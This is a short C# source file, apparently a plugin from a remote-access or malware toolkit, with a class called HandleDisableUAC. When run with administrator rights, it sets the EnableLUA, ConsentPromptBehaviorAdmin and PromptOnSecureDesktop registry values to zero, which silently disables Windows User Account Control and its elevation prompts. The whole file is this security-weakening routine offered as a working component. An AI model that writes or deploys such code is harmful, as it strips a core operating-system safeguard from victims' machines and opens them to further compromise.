using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

namespace Plugin.Handler
{
    internal class HandleDisableUAC
    {
        private readonly RegistryKey RegKey =
            Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);

        private int value;

        public void Run()
        {
            Debug.WriteLine("Plugin Invoked");
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegKey.SetValue("consentpromptbehavioradmin", "0", RegistryValueKind.DWord);
            RegKey.SetValue("enablelua", "0", RegistryValueKind.DWord);
            RegKey.SetValue("promptonsecuredesktop", "0", RegistryValueKind.DWord);
            value = (int)RegKey.GetValue("enablelua", null);
            RegKey.Close();
        }
    }
}